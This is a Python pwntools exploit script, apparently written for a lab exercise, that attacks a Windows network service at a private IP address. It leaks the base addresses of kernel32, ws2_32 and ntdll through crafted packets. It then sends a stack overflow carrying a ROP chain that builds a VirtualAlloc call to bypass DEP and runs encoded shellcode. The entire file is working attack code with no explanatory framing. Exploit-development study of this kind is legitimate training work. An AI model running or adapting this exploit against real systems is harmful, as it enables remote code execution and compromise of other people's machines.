from pwn import *
from struct import *

host = '192.168.0.103'
port = 9996
size = 4096
bigData = ""



def parseAddress(data, module):
    
    address = 0
    pattern = b'|'

    address = int(data.split(pattern)[7].split(b':')[1].strip(), 16)

    global bigData
    bigData += f"[+] Address of {module.decode()}: {hex(address)}\n"

    return address



def doLeak(opcode, module):

    data = b''

    buf  = b''
    buf += p32(0x12345678)
    buf += p32(0xdeadb33f)
    buf += p32(0x20202020)
    buf += p32(0x5A3Fd0FA)
    buf += p32(0xB8D2C0B3)
    buf += p32(0xE7A9BEEF)
    buf += p32(0x12F8D0C0)
    buf += p32(0x9C71CAFE)
    buf += p32(0x3BEAC0D3)
    buf += p32(0x6F50DEAD)
    buf += p32(0xDAB2FFFF)
    buf += p32(0x87C4A2B2)
    buf += p32(0xF503C2DD)
    buf += p32(opcode)
    buf += module
    buf += b'A' * (size - len(buf))


    io = remote(host, port)
    data += io.recv(1024)
    io.send(buf)
    data += io.recv(1024)
    data += io.recv(1024)
    io.close()


    address = parseAddress(data, module)

    return address



def doOverflow(kernel32Address, ws2Address, mainAddress, ntdllAddress):

    offset = 2012
    
    # badchars "\x00\x01\x0a\x0b\x0c\x0f\xa1\xb1\xc1\xd1\x0e\xaa\xbb\xcc"

    shellcode = b''
    shellcode += b'\x90' * 20
    shellcode += b"\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81"
    shellcode += b"\x73\x13\x09\x7f\x29\x11\x83\xeb\xfc\xe2\xf4"
    shellcode += b"\xf5\x97\xab\x11\x09\x7f\x49\x98\xec\x4e\xe9"
    shellcode += b"\x75\x82\x2f\x19\x9a\x5b\x73\xa2\x43\x1d\xf4"
    shellcode += b"\x5b\x39\x06\xc8\x63\x37\x38\x80\x85\x2d\x68"
    shellcode += b"\x03\x2b\x3d\x29\xbe\xe6\x1c\x08\xb8\xcb\xe3"
    shellcode += b"\x5b\x28\xa2\x43\x19\xf4\x63\x2d\x82\x33\x38"
    shellcode += b"\x69\xea\x37\x28\xc0\x58\xf4\x70\x31\x08\xac"
    shellcode += b"\xa2\x58\x11\x9c\x13\x58\x82\x4b\xa2\x10\xdf"
    shellcode += b"\x4e\xd6\xbd\xc8\xb0\x24\x10\xce\x47\xc9\x64"
    shellcode += b"\xff\x7c\x54\xe9\x32\x02\x0d\x64\xed\x27\xa2"
    shellcode += b"\x49\x2d\x7e\xfa\x77\x82\x73\x62\x9a\x51\x63"
    shellcode += b"\x28\xc2\x82\x7b\xa2\x10\xd9\xf6\x6d\x35\x2d"
    shellcode += b"\x24\x72\x70\x50\x25\x78\xee\xe9\x20\x76\x4b"
    shellcode += b"\x82\x6d\xc2\x9c\x54\x15\x28\x9c\x8c\xcd\x29"
    shellcode += b"\x11\x09\x2f\x41\x20\x82\x10\xae\xee\xdc\xc4"
    shellcode += b"\xd9\xa4\xab\x29\x41\xb7\x9c\xc2\xb4\xee\xdc"
    shellcode += b"\x43\x2f\x6d\x03\xff\xd2\xf1\x7c\x7a\x92\x56"
    shellcode += b"\x1a\x0d\x46\x7b\x09\x2c\xd6\xc4\x6a\x1e\x45"
    shellcode += b"\x72\x27\x1a\x51\x74\x09\x7f\x29\x11"
    shellcode += b'\x90' * (400 - len(shellcode))
    


    # VirtualAlloc
    va  = b''
    va += p32(kernel32Address + 0x1f9f0)     # VirtuaAlloc address
    va += p32(0x45454545)                    # Shellcode return address
    va += p32(0x46464646)                    # lpBaseAddress
    va += p32(0x47474747)                    # dwSize
    va += p32(0x48484848)                    # flAllocationType 
    va += p32(0x49494949)                    # flProtect


    # Rop chains
    # Shellcode return address - address of shellcode
    rop  = b''
    rop += p32(ws2Address + 0x41470)        # xchg eax, esi; ret
    rop += p32(kernel32Address + 0x367ba)   # xchg eax, ecx; ret
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += p32(0xffffffe8)                  # -18 to lpBaseAddress argument 
    rop += p32(kernel32Address + 0x367ba)   # xchg eax, ecx; ret
    rop += p32(kernel32Address + 0x203c4)   # add eax, ecx; ret
    rop += p32(ws2Address + 0x17572)        # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4 
    rop += p32(kernel32Address + 0x668da)   # xchg eax, edx; ret
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += p32(0xfffffebc)                  # -0x144
    rop += p32(kernel32Address + 0x49b4a)   # neg eax; ret
    rop += p32(kernel32Address + 0x367ba)   # xchg eax, ecx; ret
    rop += p32(kernel32Address + 0x203c4)   # add eax, ecx; ret
    rop += p32(ws2Address + 0x17572)        # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4 
    rop += p32(kernel32Address + 0x2325d)   # mov [edx], eax, mov eax, 3; ret

    #lpBaseAddress - address of shellcode
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(ws2Address + 0x2e075)        # inc eax; ret
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x367ba)   # xchg eax, ecx; ret
    rop += p32(kernel32Address + 0x203c4)   # add eax, ecx; ret
    rop += p32(ws2Address + 0x17572)        # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4 
    rop += p32(kernel32Address + 0x2325d)   # mov [edx], eax, mov eax, 3; ret

    # dwSize - 0x400
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += b'A' * 4
    rop += p32(0xfffffbff)                  # -0x401
    rop += p32(ws2Address + 0x2e075)        # inc eax; ret
    rop += p32(kernel32Address + 0x49b4a)   # neg eax; ret
    rop += p32(kernel32Address + 0x2325d)   # mov [edx], eax, mov eax, 3; ret

    # flAllocationType - 0x1000
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += b'A' * 4
    rop += p32(0xffffefff)                  # -1001
    rop += p32(ws2Address + 0x2e075)        # inc eax; ret
    rop += p32(kernel32Address + 0x49b4a)   # neg eax; ret
    rop += p32(kernel32Address + 0x2325d)   # mov [edx], eax, mov eax, 3; ret

    # flProtect - 0x40 RWE
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x5e8b2)   # inc edx; CLD # DEC ECX # RETN 0x04
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += b'A' * 4
    rop += p32(0xffffffc0)                  # -40
    rop += p32(kernel32Address + 0x49b4a)   # neg eax; ret
    rop += p32(kernel32Address + 0x2325d)   # mov [edx], eax, mov eax, 3; ret

    # Calling VirtualAlloc
    rop += p32(kernel32Address + 0x4a421)   # pop eax; ret
    rop += p32(0xfffffec0)                  # offset to VirtualAlloc
    rop += p32(kernel32Address + 0x367ba)   # xchg eax, ecx; ret
    rop += p32(kernel32Address + 0x203c4)   # add eax, ecx; ret
    rop += p32(ws2Address + 0x243ec)        # xchg eax, ebp; ret
    rop += p32(kernel32Address + 0x20566)   # mov esp, ebp, pop ebp; ret
    

    buf  = b''
    buf += p32(0x12345678)
    buf += p32(0xdeadb33f)
    buf += p32(0x20202020)
    buf += p32(0x5A3Fd0FA)
    buf += p32(0xB8D2C0B3)
    buf += p32(0xE7A9BEEF)
    buf += p32(0x12F8D0C0)
    buf += p32(0x9C71CAFE)
    buf += p32(0x3BEAC0D3)
    buf += p32(0x6F50DEAD)
    buf += p32(0xDAB2FFFF)
    buf += p32(0x87C4A2B2)
    buf += p32(0xF503C2DD)
    buf += p32(0xfffff388)
    buf += b'A' * (offset - len(buf) - len(va))
    buf += va
    buf += p32(kernel32Address + 0x6e6dd)   # push esp; pop esi; ret
    buf += rop
    buf += shellcode
    buf += b'\x90' * (size - 1 - len(buf))


    io = remote(host, port)
    io.recv(1024)
    io.send(buf)
    io.recv(1024)
    io.close()



def main():
    
    kernel32Address = doLeak(0xfffff385, b'KERNEL32.dll')
    ws2Address = doLeak(0xfffff384, b'WS2_32.dll')
    mainAddress = doLeak(0xfffff386, b'main')
    ntdllAddress = doLeak(0xfffff387, b'NTDLL.dll')

    global bigData
    print(bigData)

    doOverflow(kernel32Address, ws2Address, mainAddress, ntdllAddress)




if __name__ == '__main__':
    main()